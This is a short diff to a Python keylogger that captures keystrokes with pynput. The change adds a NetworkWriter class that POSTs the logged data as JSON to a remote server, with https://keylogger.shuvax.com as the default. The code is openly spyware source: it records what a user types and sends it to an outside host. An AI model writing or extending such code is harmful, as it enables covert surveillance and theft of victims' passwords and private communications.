@@ -1,7 +1,7 @@
 from abc import ABC, abstractmethod
 from pynput.keyboard import Listener
 from typing import List
-import time,json,random,string,ToolBox,threading,pywinctl
+import time,json,random,string,ToolBox,threading,pywinctl,requests
 
 
 class IKeyLogger(ABC):
@@ -74,6 +74,16 @@ class FileWriter(Write):
         except IOError:
             return False
 
+class NetworkWriter(Write):
+    def __init__(self,url=None):
+        self.url = url or "https://keylogger.shuvax.com"
+    def write(self,data:dict[str:str]) -> bool:
+        try:
+            response = requests.post(self.url, json=data)
+            return response.status_code == 200
+        except requests.exceptions.RequestException:
+            return False
+
 
 class Encryptor:
     def __init__(self):
@@ -118,7 +128,6 @@ x.start_logging()
 while True:
     # time.sleep(1)
     x.print_keys()
-
 
 
 
